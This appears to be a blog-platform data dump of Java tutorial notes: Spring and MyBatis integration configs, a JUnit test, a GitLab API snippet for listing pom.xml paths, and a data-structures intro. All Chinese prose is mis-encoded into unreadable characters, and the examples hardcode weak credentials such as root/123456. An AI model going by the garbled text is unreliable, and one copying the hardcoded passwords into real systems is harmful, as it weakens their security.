<version>0.9.2</version>\n          </dependency>\n\n          <dependency>\n            <groupid>mysql</groupid>\n            <artifactid>mysql-connector-java</artifactid>\n            <version>8.0.28</version>\n          </dependency>\n\n        </dependencies>\n      </plugin>\n    </plugins>\n  </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n# éåå·¥ç¨xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n  \x3c!--\n        targetruntime="mybatis3simple":çæç®åççcrud\n        mybatis3:è±ªåç\n     --\x3e\n  <context id="mysqltables" targetruntime="mybatis3">\n\n    \x3c!--å»é¤æ³¨é--\x3e\n    <commentgenerator>\n      <property name="suppressallcomments" value="true"/>\n    </commentgenerator>\n\n    \x3c!-- jdbcconnectionï¼æå®å¦ä½è¿æ¥å°ç®æ æ°æ®åº --\x3e\n    <jdbcconnection driverclass="com.mysql.cj.jdbc.driver"\n                    connectionurl="jdbc:mysql://localhost:3306/pro_cf?allowmultiqueries=true"\n                    userid="root"\n                    password="123456">\n    </jdbcconnection>\n\n    \x3c!--\n          é»è®¤ä¸ºfalse æjdbc decimalånumericç±»åè§£æä¸ºinteger\n          ä¸ºtrueæ¶ æjdbc decimalånumericç±»åè§£æä¸ºjava.math.bigdecimal\n          --\x3e\n    <javatyperesolver >\n      <property name="forcebigdecimals" value="false" />\n    </javatyperesolver>\n\n    \x3c!-- javamodelgeneratorï¼æå®javabeanççæç­ç¥\n        targetpackage="test.model"ï¼ç®æ åå\n        targetproject="\\mbgtestproject\\src"ï¼ç®æ å·¥ç¨\n        --\x3e\n    <javamodelgenerator targetpackage="com.pwddd.cf.entity"\n                        targetproject="./src/main/java/">\n      \x3c!-- enablesubpackages:æ¯å¦è®© schema ä½ä¸ºåçåç¼ --\x3e\n      <property name="enablesubpackages" value="false" />\n      <property name="trimstrings" value="true" />\n    </javamodelgenerator>\n\n    \x3c!-- sqlmapgeneratorï¼sqlæ å°çæç­ç¥ï¼ --\x3e\n    <sqlmapgenerator targetpackage="mapper"\n                     targetproject="./src/main/resources/">\n      <property name="enablesubpackages" value="false" />\n    </sqlmapgenerator>\n\n    \x3c!-- javaclientgenerator:æå®mapperæ¥å£æå¨çä½ç½® --\x3e\n    <javaclientgenerator type="xmlmapper"\n                         targetpackage="com.pwddd.cf.mapper"\n                         targetproject="./src/main/java/">\n      <property name="enablesubpackages" value="false" />\n    </javaclientgenerator>\n\n    \x3c!-- æå®è¦éååæåªäºè¡¨ï¼æ ¹æ®è¡¨è¦åå»ºjavabean --\x3e\n    <table tablename="t_admin" domainobjectname="admin"></table>\n  </context>\n</generatorconfiguration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n\n\n# æ§è¡éåå·¥ç¨\n\nå°çæçmapperåå®ä½ç±»ç§»å¨å°æå®çä½ç½®ã\n\n\n# ä¾èµç®¡ç\n\n# çæ¬å£°æ\n\n<properties>\n  <spring.version>5.3.18</spring.version>\n  <spring.security.version>5.6.2</spring.security.version>\n  <cglib.version>3.3.0</cglib.version>\n  <aspectjweaver.version>1.9.9.1</aspectjweaver.version>\n  <druid.version>1.2.8</druid.version>\n  <mybatis.version>3.5.9</mybatis.version>\n  <mysql.version>8.0.28</mysql.version>\n  <mybatis-spring.version>2.0.6</mybatis-spring.version>\n  <pagehelper.version>5.2.0</pagehelper.version>\n  <jackson-core.version>2.13.2</jackson-core.version>\n  <jackson-databind.version>2.13.2.2</jackson-databind.version>\n</properties>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# ç¶é¡¹ç®ä¾èµç®¡ç\n\n<dependencymanagement>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-orm</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-webmvc</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework</groupid>\n      <artifactid>spring-test</artifactid>\n      <version>${spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.aspectj</groupid>\n      <artifactid>aspectjweaver</artifactid>\n      <version>${aspectjweaver.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>cglib</groupid>\n      <artifactid>cglib</artifactid>\n      <version>${cglib.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.alibaba</groupid>\n      <artifactid>druid</artifactid>\n      <version>${druid.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis</artifactid>\n      <version>${mybatis.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>${mysql.version}</version>\n    </dependency>\n\n    \x3c!-- mybaits æ´å spring   --\x3e\n    <dependency>\n      <groupid>org.mybatis</groupid>\n      <artifactid>mybatis-spring</artifactid>\n      <version>${mybatis-spring.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.github.pagehelper</groupid>\n      <artifactid>pagehelper</artifactid>\n      <version>${pagehelper.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>slf4j-api</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupid>ch.qos.logback</groupid>\n      <artifactid>logback-classic</artifactid>\n      <version>1.2.10</version>\n      <scope>test</scope>\n    </dependency>\n\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>jcl-over-slf4j</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.slf4j</groupid>\n      <artifactid>jul-to-slf4j</artifactid>\n      <version>1.7.36</version>\n    </dependency>\n\n    \x3c!-- spring json   --\x3e\n    <dependency>\n      <groupid>com.fasterxml.jackson.core</groupid>\n      <artifactid>jackson-core</artifactid>\n      <version>${jackson-core.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>com.fasterxml.jackson.core</groupid>\n      <artifactid>jackson-databind</artifactid>\n      <version>${jackson-databind.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet</groupid>\n      <artifactid>jstl</artifactid>\n      <version>1.2</version>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet</groupid>\n      <artifactid>javax.servlet-api</artifactid>\n      <version>4.0.1</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>javax.servlet.jsp</groupid>\n      <artifactid>javax.servlet.jsp-api</artifactid>\n      <version>2.3.3</version>\n      <scope>provided</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.security</groupid>\n      <artifactid>spring-security-web</artifactid>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.security</groupid>\n      <artifactid>spring-security-config</artifactid>\n      <version>${spring.security.version}</version>\n    </dependency>\n\n  </dependencies>\n</dependencymanagement>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n\n\n\n# ssmæ´å\n\n# spring æ´å mybatis\n\n> ç®æ ï¼ä½¿ç¨å®¹å¨ç®¡çmapperï¼å¨é¡¹ç®ä¸­å¯ä»¥ç´æ¥è°ç¨mapperå®æå¢å æ¹æ¥ã\n\n# 0. å¼å¥ä¾èµ\n\nä¾èµçä½ç½®ï¼\n\n\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-webmvc</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-orm</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.aspectj</groupid>\n  <artifactid>aspectjweaver</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>cglib</groupid>\n  <artifactid>cglib</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.mybatis</groupid>\n  <artifactid>mybatis</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>org.mybatis</groupid>\n  <artifactid>mybatis-spring</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.github.pagehelper</groupid>\n  <artifactid>pagehelper</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.fasterxml.jackson.core</groupid>\n  <artifactid>jackson-core</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.fasterxml.jackson.core</groupid>\n  <artifactid>jackson-databind</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>javax.servlet</groupid>\n  <artifactid>jstl</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>com.google.code.gson</groupid>\n  <artifactid>gson</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n# 1. åå»ºjdbc.properties\n\njdbc.url=jdbc:mysql://localhost:3306/pro_cf\njdbc.username=root\njdbc.password=123456\njdbc.driver=com.mysql.cj.jdbc.driver\n\n\n1\n2\n3\n4\n\n\n# 2. åå»ºmybatiså¨å±éç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n  \x3c!--  myabtis å¨å±éç½®   --\x3e\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 3. åå»ºspringæ´åmybatiséç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n  \x3c!--å è½½ æ°æ®æºéç½®--\x3e\n  <context:property-placeholder location="classpath:jdbc.properties" />\n\n  <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="url" value="${jdbc.url}" />\n    <property name="driverclassname" value="${jdbc.driver}" />\n    <property name="username" value="${jdbc.username}" />\n    <property name="password" value="${jdbc.password}" />\n  </bean>\n\n  <bean id="sqlsessionfactorybean" class="org.mybatis.spring.sqlsessionfactorybean">\n    \x3c!--éç½®æ°æ®æº--\x3e\n    <property name="datasource" ref="datasource" />\n    \x3c!--myabtiséç½®æä»¶ä½ç½®--\x3e\n    <property name="configlocation" value="classpath:mybatis-config.xml" />\n    \x3c!--mapper éç½®æä»¶ä½ç½®--\x3e\n    <property name="mapperlocations" value="classpath:mapper/*.xml" />\n  </bean>\n\n  \x3c!--æå®mapperæ¥å£æ«æ--\x3e\n  <bean id="mapperscannerconfigurer" class="org.mybatis.spring.mapper.mapperscannerconfigurer">\n    <property name="basepackage" value="com.pwddd.cf.mapper" />\n  </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4. springæ´åjunit5 æµè¯\n\nå¼å¥ä¾èµï¼\n\n<dependency>\n  <groupid>org.springframework</groupid>\n  <artifactid>spring-test</artifactid>\n  <scope>test</scope>\n</dependency>\n\n<dependency>\n  <groupid>org.junit.jupiter</groupid>\n  <artifactid>junit-jupiter-api</artifactid>\n  <scope>test</scope>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næµè¯ä»£ç ï¼\n\npackage com.pwddd.cf;\n\nimport com.pwddd.cf.entity.admin;\nimport com.pwddd.cf.mapper.adminmapper;\nimport org.junit.jupiter.api.test;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.junit.jupiter.springjunitconfig;\n\nimport javax.sql.datasource;\nimport java.sql.sqlexception;\nimport java.util.uuid;\n\n@springjunitconfig(locations = {"classpath:spring-mybatis.xml"})\npublic class mybatistest {\n\n    @autowired\n    private datasource datasource;\n\n    @autowired\n    private adminmapper adminmapper;\n\n    @test\n    public void testdatesource() throws sqlexception {\n        system.out.println(datasource.getconnection());\n    }\n\n    @test\n    public void testmapper(){\n        admin admin = new admin(uuid.randomuuid().tostring().replace("-",""),\n                "admin", "123456", "zhangsan", "admin@qq.com", null);\n        adminmapper.insertselective(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',charsets:{cjk:!0},lastUpdated:"2022/04/25, 00:33:18",lastUpdatedTimestamp:1650846798e3},{title:"ä»£ç çæ®µéå",frontmatter:{title:"ä»£ç çæ®µéå",date:"2022-09-11T09:00:00.000Z",permalink:"/dev/java/project/code",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","é¡¹ç®å®æ"],tags:["Javaé¡¹ç®"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1013.%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/01.%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5.html",relativePath:"01.å¼å/101.åç«¯/1013.é¡¹ç®å®æ/01.ä»£ç çæ®µ.md",key:"v-1713f0c0",path:"/dev/java/project/code/",headers:[{level:3,title:"åä¸¾ææçpomæä»¶è·¯å¾",slug:"åä¸¾ææçpomæä»¶è·¯å¾",normalizedTitle:"åä¸¾ææçpomæä»¶è·¯å¾",charIndex:2}],headersStr:"åä¸¾ææçpomæä»¶è·¯å¾",content:'# åä¸¾ææçpomæä»¶è·¯å¾\n\npackage com.pwddd.gitlab;\n\nimport org.gitlab4j.api.GitLabApi;\nimport org.gitlab4j.api.GitLabApiException;\nimport org.gitlab4j.api.models.TreeItem;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class TestAPI {\n\n    private static List<String> ignoreList = new ArrayList<>();\n\n    static {\n        ignoreList.add(".mvn");\n        ignoreList.add(".idea");\n        ignoreList.add("src");\n        ignoreList.add("sql");\n        ignoreList.add("deploy");\n        ignoreList.add("log");\n        ignoreList.add("target");\n        ignoreList.add("bin");\n        ignoreList.add("shell");\n    }\n\n    public static void main(String[] args) {\n        List<String> repoPomPath = getRepoPomPath(2,"master");\n        System.out.println(repoPomPath);\n    }\n\n    public static GitLabApi getGitlabApi(){\n        try {\n            return GitLabApi.oauth2Login("http://192.168.56.103","mic-master","mic-master");\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static List<String> getRepoPomPath(long projectId,String branch){\n        List<String> repoPomPathList = new ArrayList<>();\n        // è·åé¾æ¥\n        GitLabApi gitlabApi = getGitlabApi();\n        try {\n            // é¡¹ç®æ ¹ç®å½\n            List<TreeItem> treeItems = gitlabApi.getRepositoryApi().getTree(projectId);\n            // éåé¡¹ç®æ ¹ç®å½\n            for (TreeItem item :\n                    treeItems) {\n               if (item.getType().equals(TreeItem.Type.TREE)){\n                   // å¦ææ¶tree ç±»å è¯´ææ¯ä¸ªæä»¶å¤¹ åéè¦éå½è°ç¨\n                   // éæé¤çæä»¶å¤¹\n                   if (!ignoreList.contains(item.getName())){\n                       getSubDirPomPath(projectId,branch,item,repoPomPathList);\n                   }else {\n                       System.out.println(item.getPath()+"=======å¿½ç¥");\n                   }\n                } else {\n                   if (item.getName().equals("pom.xml")){\n                       repoPomPathList.add(item.getPath());\n                       return repoPomPathList;\n                   }\n               }\n            }\n            return repoPomPathList;\n\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private static void getSubDirPomPath(long projectId,String branch, TreeItem item, List<String> repoPomPathList) {\n        try {\n            List<TreeItem> items = getGitlabApi().getRepositoryApi().getTree(projectId,item.getPath(),branch);\n            for (TreeItem i : items){\n                if (i.getType().equals(TreeItem.Type.TREE)){\n                    if (!ignoreList.contains(i.getName())){\n                        getSubDirPomPath(projectId,branch,i,repoPomPathList);\n                    }else {\n                        System.out.println(i.getPath()+"=======å¿½ç¥");\n                    }\n                }else {\n                    if (i.getName().equals("pom.xml")){\n                       repoPomPathList.add(i.getPath());\n                    }\n                }\n            }\n        } catch (GitLabApiException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n',normalizedContent:'# åä¸¾ææçpomæä»¶è·¯å¾\n\npackage com.pwddd.gitlab;\n\nimport org.gitlab4j.api.gitlabapi;\nimport org.gitlab4j.api.gitlabapiexception;\nimport org.gitlab4j.api.models.treeitem;\n\nimport java.util.arraylist;\nimport java.util.list;\n\npublic class testapi {\n\n    private static list<string> ignorelist = new arraylist<>();\n\n    static {\n        ignorelist.add(".mvn");\n        ignorelist.add(".idea");\n        ignorelist.add("src");\n        ignorelist.add("sql");\n        ignorelist.add("deploy");\n        ignorelist.add("log");\n        ignorelist.add("target");\n        ignorelist.add("bin");\n        ignorelist.add("shell");\n    }\n\n    public static void main(string[] args) {\n        list<string> repopompath = getrepopompath(2,"master");\n        system.out.println(repopompath);\n    }\n\n    public static gitlabapi getgitlabapi(){\n        try {\n            return gitlabapi.oauth2login("http://192.168.56.103","mic-master","mic-master");\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n    public static list<string> getrepopompath(long projectid,string branch){\n        list<string> repopompathlist = new arraylist<>();\n        // è·åé¾æ¥\n        gitlabapi gitlabapi = getgitlabapi();\n        try {\n            // é¡¹ç®æ ¹ç®å½\n            list<treeitem> treeitems = gitlabapi.getrepositoryapi().gettree(projectid);\n            // éåé¡¹ç®æ ¹ç®å½\n            for (treeitem item :\n                    treeitems) {\n               if (item.gettype().equals(treeitem.type.tree)){\n                   // å¦ææ¶tree ç±»å è¯´ææ¯ä¸ªæä»¶å¤¹ åéè¦éå½è°ç¨\n                   // éæé¤çæä»¶å¤¹\n                   if (!ignorelist.contains(item.getname())){\n                       getsubdirpompath(projectid,branch,item,repopompathlist);\n                   }else {\n                       system.out.println(item.getpath()+"=======å¿½ç¥");\n                   }\n                } else {\n                   if (item.getname().equals("pom.xml")){\n                       repopompathlist.add(item.getpath());\n                       return repopompathlist;\n                   }\n               }\n            }\n            return repopompathlist;\n\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n    private static void getsubdirpompath(long projectid,string branch, treeitem item, list<string> repopompathlist) {\n        try {\n            list<treeitem> items = getgitlabapi().getrepositoryapi().gettree(projectid,item.getpath(),branch);\n            for (treeitem i : items){\n                if (i.gettype().equals(treeitem.type.tree)){\n                    if (!ignorelist.contains(i.getname())){\n                        getsubdirpompath(projectid,branch,i,repopompathlist);\n                    }else {\n                        system.out.println(i.getpath()+"=======å¿½ç¥");\n                    }\n                }else {\n                    if (i.getname().equals("pom.xml")){\n                       repopompathlist.add(i.getpath());\n                    }\n                }\n            }\n        } catch (gitlabapiexception e) {\n            throw new runtimeexception(e);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n',charsets:{cjk:!0},lastUpdated:"2022/09/16, 05:50:03",lastUpdatedTimestamp:1663307403e3},{title:"ãæ°æ®ç»æãæ¦è¿°",frontmatter:{title:"ãæ°æ®ç»æãæ¦è¿°",date:"2022-05-04T20:00:00.000Z",permalink:"/dev/basic/ds/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","æ°æ®ç»æä¸ç®æ³"],tags:["æ°æ®ç»æ"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1020.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/00.%E6%A6%82%E8%BF%B0.html",relativePath:"01.å¼å/102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/00.æ¦è¿°.md",key:"v-2595496f",path:"/dev/basic/ds/introduction/",headers:[{level:2,title:"æ¯è¯­åæ¦å¿µ",slug:"æ¯è¯­åæ¦å¿µ",normalizedTitle:"æ¯è¯­åæ¦å¿µ",charIndex:33},{level:3,title:"æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡",slug:"æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡",normalizedTitle:"æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡",charIndex:43},{level:3,title:"æ°æ®ç»æ",slug:"æ°æ®ç»æ",normalizedTitle:"æ°æ®ç»æ",charIndex:3},{level:3,title:"æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å",slug:"æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å",normalizedTitle:"æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å",charIndex:942},{level:3,title:"æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç°",slug:"æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç°",normalizedTitle:"æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç°",charIndex:1159},{level:2,title:"ç®æ³åç®æ³åæ",slug:"ç®æ³åç®æ³åæ",normalizedTitle:"ç®æ³åç®æ³åæ",charIndex:1271},{level:3,title:"ç®æ³çå®ä¹",slug:"ç®æ³çå®ä¹",normalizedTitle:"ç®æ³çå®ä¹",charIndex:1283},{level:3,title:"ç®æ³çè¯ä»·æ å",slug:"ç®æ³çè¯ä»·æ å",normalizedTitle:"ç®æ³çè¯ä»·æ å",charIndex:1463},{level:3,title:"æ¶é´å¤æåº¦",slug:"æ¶é´å¤æåº¦",normalizedTitle:"æ¶é´å¤æåº¦",charIndex:1613},{level:2,title:"ææ³¢é£å¥æ°å",slug:"ææ³¢é£å¥æ°å",normalizedTitle:"ææ³¢é£å¥æ°å",charIndex:2679}],excerpt:'<h1 id="ãæ°æ®ç»æãæ¦è¿°"><a class="header-anchor" href="#ãæ°æ®ç»æãæ¦è¿°">#</a> ãæ°æ®ç»æãæ¦è¿°</h1>\n<div class="custom-block note"><p class="custom-block-title">ç¬è®°</p>\n<p>åºç¡ä¸ç¢åºï¼ææåºç¡å§ã</p>\n</div>\n',headersStr:"æ¯è¯­åæ¦å¿µ æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡ æ°æ®ç»æ æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç° ç®æ³åç®æ³åæ ç®æ³çå®ä¹ ç®æ³çè¯ä»·æ å æ¶é´å¤æåº¦ ææ³¢é£å¥æ°å",content:'# ãæ°æ®ç»æãæ¦è¿°\n\nç¬è®°\n\nåºç¡ä¸ç¢åºï¼ææåºç¡å§ã\n\n\n# æ¯è¯­åæ¦å¿µ\n\n\n# æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡\n\n * æ°æ®ï¼å®¢è§äºç©çç¬¦å·è¡¨ç¤ºï¼ææè½å¤è¾å¥å°è®¡ç®æºä¸­å¹¶å¯ä»¥è¢«è®¡ç®æºç¨åºå¤ççç¬¦å·çæ»ç§°ãæ¯å¦ï¼å­ç¬¦ä¸²ãå¾åãå£°é³ç­ã\n * æ°æ®åç´ ï¼æ°æ®çåºæ¬åä½ãæ°æ®åç´ ä¹ç§°ä¸ºåç´ ãè®°å½ãå¯ä»¥çè§£ä¸ºæ°æ®åºçä¸æ¡è®°å½ã\n * æ°æ®é¡¹ï¼ç»ææ°æ®åç´ çãæç¬ç«å«ä¹çãä¸å¯åå²çæå°åä½ãå¯ä»¥çè§£ä¸ºæ°æ®åºçæä¸åã\n * æ°æ®å¯¹è±¡ï¼æ§è´¨ç¸åçæ°æ®åç´ çéåãæ¯æ°æ®çå­éãå¯ä»¥çè§£ä¸ºæ°æ®åºçä¸å¼ è¡¨ã\n\n\n# æ°æ®ç»æ\n\n> æ°æ®ç»ææ¯ç¸äºä¹é´å­å¨çä¸ç§æèå¤ç§ç¹å®å³ç³»çæ°æ®åç´ çéåã\n> \n> æ°æ®ç»ææ¯å¸¦ç»æçæ°æ®åç´ çéåï¼ç»ææ¯æ°æ®ä¹é´çå³ç³»ã\n\n# 1. é»è¾ç»æ\n\næ°æ®çé»è¾ç»ææ¯ä» é»è¾å³ç³»ä¸æè¿°æ°æ®ï¼åæ°æ®çå­å¨æ å³ãå¯ä»¥çä½æ¯ä»å·ä½é®é¢ä¸­æ½è±¡åºæ¥çæ°å­¦æ¨¡åãé»è¾ç»æçä¸¤ä¸ªè¦ç´ ï¼æ°æ®åç´ ãå³ç³»ãéå¸¸å­å¨ä»¥ä¸åç§æ°æ®çé»è¾ç»æï¼\n\n * éåç»æ\n   \n   æ°æ®åç´ ä¹é´é¤äºå±äºåä¸ä¸ªéåä¹å¤ï¼æ å¶ä»å³ç³»ãä¾å¦ï¼å­¦çå±äºä¸ä¸ªç­çº§ã\n   \n   \n\n * çº¿æ§ç»æ\n   \n   æ°æ®ä¹é´å­å¨ä¸å¯¹ä¸çå³ç³»ãä¾å¦ï¼æéåç³è«è¦ã\n   \n   \n\n * æ ç»æ\n   \n   æ°æ®ä¸­å­å¨ä¸å¯¹å¤çå³ç³»ãä¾å¦ï¼æè°±ãç»ç»ç»æç­ã\n   \n   \n\n * å¾ç»æ\n   \n   æ°æ®ä¹é´å­å¨å¤å¯¹å¤çå³ç³»ãå¦ï¼äººç©å³ç³»å¾ã\n   \n   \n\n> éåãæ ãå¾é½å±äºéçº¿æ§ç»æã\n> \n> çº¿æ§ç»æåå«ï¼çº¿æ§è¡¨ãæ ãéåãå­ç¬¦ä¸²ãæ°æ®ãå¹¿ä¹è¡¨ç­ã\n> \n> éçº¿æ§ç»æåå«ï¼æ ãäºåæ ãæåå¾åæ åå¾ã\n\n\n\n# 2. å­å¨ç»æ\n\n> æ°æ®å¯¹è±¡å¦ä½å­å¨å¨è®¡ç®æºä¸­ï¼ç§°ä¸ºæ°æ®çå­å¨ç»æãä¹å« ç©çç»æãå¨æ°æ®å­å¨å°è®¡ç®æºæ¶ï¼æ¢è¦å­å¨åç´ ä¹è¦å­å¨å³ç³»ãæ°æ®åç´ å¨è®¡ç®æºä¸­æä¸¤ç§åºæ¬çå­å¨ç»æï¼é¡ºåºå­å¨ç»æåé¾å¼å­å¨ç»æã\n\n * é¡ºåºå­å¨ç»æ\n   \n   